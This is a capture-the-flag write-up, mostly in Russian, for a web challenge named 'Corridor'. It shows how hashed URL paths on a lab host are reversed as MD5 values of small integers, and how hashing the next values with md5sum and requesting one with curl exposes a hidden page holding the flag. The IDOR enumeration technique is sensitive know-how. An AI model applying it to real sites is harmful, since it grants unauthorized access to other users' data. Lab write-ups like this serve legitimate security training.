# Writeup: Corridor

> You have found yourself in a strange corridor. Can you find your way back to where you came?
In this challenge, you will explore potential IDOR vulnerabilities. Examine the URL endpoints you access as you navigate the website and note the hexadecimal values you find (they look an awful lot like a hash, don't they?). This could help you uncover website locations you were not expected to access.

Сначала соберем все ссылки со страницы, получилась такая картина:
```sh
http://10.114.177.14/c4ca4238a0b923820dcc509a6f75849b
http://10.114.177.14/c81e728d9d4c2f636f067f89cc14862c
http://10.114.177.14/eccbc87e4b5ce2fe28308fd9f2a7baf3
http://10.114.177.14/a87ff679a2f3e71d9181a67b7542122c
http://10.114.177.14/e4da3b7fbbce2345d7772b0674a318d5
http://10.114.177.14/1679091c5a880faf6fb5e6087eb1b2dc
http://10.114.177.14/8f14e45fceea167a5a36dedd4bea2543
http://10.114.177.14/c9f0f895fb98ab9159f51fd0297e236d
http://10.114.177.14/45c48cce2e2d7fbdea1afc51c7c6ad26
http://10.114.177.14/d3d9446802a44259755d38e6d163e820
http://10.114.177.14/6512bd43d9caa6e02c990b0a82652dca
http://10.114.177.14/c20ad4d76fe97759aa27a0c99bff6710
http://10.114.177.14/c51ce410c124a10e0db5e4b97fc2af39
```
Это похоже на хеш, поэтому можно попробовать получить исходное значение, воспользовавшись сервисом [md5decrypt](https://md5decrypt.net/). По итогу получаем следующие значения:
```sh
c4ca4238a0b923820dcc509a6f75849b -> 1
c81e728d9d4c2f636f067f89cc14862c -> 2
eccbc87e4b5ce2fe28308fd9f2a7baf3 -> 3
a87ff679a2f3e71d9181a67b7542122c -> 4
e4da3b7fbbce2345d7772b0674a318d5 -> 5
1679091c5a880faf6fb5e6087eb1b2dc -> 6
8f14e45fceea167a5a36dedd4bea2543 -> 7
c9f0f895fb98ab9159f51fd0297e236d -> 8
45c48cce2e2d7fbdea1afc51c7c6ad26 -> 9
d3d9446802a44259755d38e6d163e820 -> 10
6512bd43d9caa6e02c990b0a82652dca -> 11
c20ad4d76fe97759aa27a0c99bff6710 -> 12
c51ce410c124a10e0db5e4b97fc2af39 -> 13
```
Попробуем получить хеш значений 0 и 14 для формирования новых URL:
```sh
echo -n 0| md5sum
cfcd208495d565ef66e7dff9f98764da
```
```sh
echo -n 14| md5sum
aab3238922bcc25a6f606eb525ffdc56  -
```
Получаем два URL:
- http://10.114.177.14/cfcd208495d565ef66e7dff9f98764da
- http://10.114.177.14/aab3238922bcc25a6f606eb525ffdc56

Сделаем запрос к первому URL и получаем флаг
```sh
curl -s http://10.114.177.14/cfcd208495d565ef66e7dff9f98764da | grep
"flag"
    flag{2477ef02448ad9156661ac40a6b8862e}
```

### Используемые инструменты
- md5sum
- [md5decrypt](https://md5decrypt.net/)
- curl
- [CyberWarn c модификацией парсера](https://github.com/rickert155/CyberWarn)
